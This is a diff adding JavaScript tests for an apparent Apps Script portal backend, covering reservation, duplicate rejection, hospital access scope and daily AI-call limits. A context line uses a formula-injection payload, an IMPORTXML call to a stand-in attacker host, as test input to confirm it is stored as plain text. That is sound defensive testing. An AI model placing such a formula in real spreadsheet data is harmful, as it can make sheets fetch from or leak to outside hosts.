@@ -97,6 +97,24 @@ function gasFixture(){
  const post=(c,who=identity,timestamp=now.getTime(),bad=false,operation)=>{const payload=JSON.stringify({v:2,audience:'standard-portal-mou-writer',timestamp,identity:who,command:c,...(operation?{operation}:{})});return JSON.parse(context.doPost({postData:{contents:JSON.stringify({payload,signature:bad?'0'.repeat(64):createHmac('sha256','a'.repeat(64)).update(payload).digest('hex')})}}));};
  return {post,props,grids,context,get batches(){return batches;},get held(){return held;},set blocked(v){blocked=v;},set failCommit(v){failCommit=v;}};
 }
+
+test('bundled service reserves atomically, rejects duplicate sends and settles only once',()=>{
+ const g=gasFixture(),c={requestId:randomUUID(),action:'telegram',kind:'daily',slot:'2026-09-07',contentHash:'b'.repeat(64)};
+ const post=command=>g.post(command,admin,now.getTime(),false,'service');
+ const r=post(c);assert.equal(r.ok,true);assert.equal(g.batches,1);assert.equal(g.grids.audit_log.length,2);assert.equal(g.grids.write_requests.length,2);
+ assert.equal(post(c).replayed,true);assert.equal(g.batches,1);
+ assert.equal(post({...c,requestId:randomUUID()}).error,'SERVICE_ALREADY_RESERVED');assert.equal(g.batches,1);
+ const done={requestId:randomUUID(),action:'settle',reservationId:r.recordId,outcome:'sent',externalId:'123'};
+ assert.equal(post(done).ok,true);assert.equal(g.batches,2);
+ assert.equal(post({...done,requestId:randomUUID()}).error,'SERVICE_ALREADY_SETTLED');assert.equal(g.batches,2);
+});
+
+test('bundled AI reservations enforce hospital scope and per-account daily budget',()=>{
+ const g=gasFixture(),c=()=>({requestId:randomUUID(),action:'ai',module:'mou',hospitalId:'09625',year:2569,contentHash:'c'.repeat(64)});
+ assert.equal(g.post({...c(),hospitalId:'09626'},identity,now.getTime(),false,'service').error,'HOSPITAL_ACCESS_DENIED');
+ for(let i=0;i<10;i++)assert.equal(g.post(c(),identity,now.getTime(),false,'service').ok,true);
+ assert.equal(g.post(c(),identity,now.getTime(),false,'service').error,'AI_DAILY_LIMIT');assert.equal(g.batches,10);
+});
 test('bundled Apps Script writes all records in one batch, literal text, and rejects stale second writer',()=>{
  const g=gasFixture(),c=save({detail:'=IMPORTXML("https://evil.test")'});let r=g.post(c);assert.equal(r.ok,true);assert.equal(g.batches,1);assert.equal(g.held,false);
  assert.equal(g.grids.mou_progress[1][5],c.detail);assert.equal(g.grids.audit_log.length,2);assert.equal(g.grids.write_requests.length,2);
